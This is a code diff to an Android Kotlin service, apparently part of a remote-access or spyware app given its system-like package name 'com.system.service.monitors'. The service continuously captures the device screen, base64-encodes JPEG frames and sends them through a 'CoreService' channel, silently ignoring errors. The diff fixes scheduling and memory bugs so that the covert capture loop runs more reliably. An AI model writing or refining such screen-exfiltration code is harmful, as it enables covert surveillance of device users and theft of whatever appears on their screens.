@@ -1,7 +1,6 @@
 package com.system.service.monitors
 
 import android.app.*
-import android.content.Context
 import android.content.Intent
 import android.graphics.Bitmap
 import android.graphics.PixelFormat
@@ -37,6 +36,8 @@ class ScreenStreamService : Service() {
     private var thread: HandlerThread? = null
     private var handler: Handler? = null
     private var intervalMs: Long = 1000L
+    // Fix: track whether a capture is already scheduled to prevent double-scheduling
+    private var captureScheduled = false
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         if (intent?.action == "STOP") { stopStream(); stopSelf(); return START_NOT_STICKY }
@@ -46,6 +47,7 @@ class ScreenStreamService : Service() {
         intervalMs = intent?.getLongExtra("interval", 1000L) ?: 1000L
         isRunning = true
         streaming.set(true)
+        captureScheduled = false
         startProjection()
         return START_STICKY
     }
@@ -76,37 +78,45 @@ class ScreenStreamService : Service() {
     }
 
     private fun scheduleCapture(w: Int, h: Int) {
-        if (!streaming.get()) return
-        handler?.post {
+        if (!streaming.get() || captureScheduled) return
+        captureScheduled = true
+        handler?.postDelayed({
+            captureScheduled = false
+            if (!streaming.get()) return@postDelayed
             try {
                 val img: Image = imageReader?.acquireLatestImage() ?: run {
-                    handler?.postDelayed({ scheduleCapture(w, h) }, intervalMs)
-                    return@post
+                    scheduleCapture(w, h)
+                    return@postDelayed
                 }
+                // Fix: copy pixel data BEFORE closing the image
                 val plane = img.planes[0]
                 val rowStride = plane.rowStride
                 val pixelStride = plane.pixelStride
                 val buf = plane.buffer
                 val bmp = Bitmap.createBitmap(rowStride / pixelStride, h, Bitmap.Config.ARGB_8888)
                 bmp.copyPixelsFromBuffer(buf)
+                img.close() // safe to close now — pixels already copied into bmp
+
                 val cropped = Bitmap.createBitmap(bmp, 0, 0, w, h)
-                img.close()
+                bmp.recycle()
 
                 val baos = ByteArrayOutputStream()
                 cropped.compress(Bitmap.CompressFormat.JPEG, 50, baos)
+                cropped.recycle()
+
                 val b64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
                 CoreService.instance?.sendData("screen_frame", JSONObject().apply {
                     put("frame", b64); put("w", w); put("h", h)
                 })
             } catch (_: Exception) {}
-            handler?.postDelayed({ scheduleCapture(w, h) }, intervalMs)
-        }
+            scheduleCapture(w, h)
+        }, intervalMs)
     }
 
     private fun stopStream() {
         streaming.set(false); isRunning = false
         try { virtualDisplay?.release() } catch (_: Exception) {}
-        try { imageReader?.close() } catch (_: Exception) {}
+        try { imageReader?.close() }    catch (_: Exception) {}
         try { mediaProjection?.stop() } catch (_: Exception) {}
         thread?.quitSafely()
     }
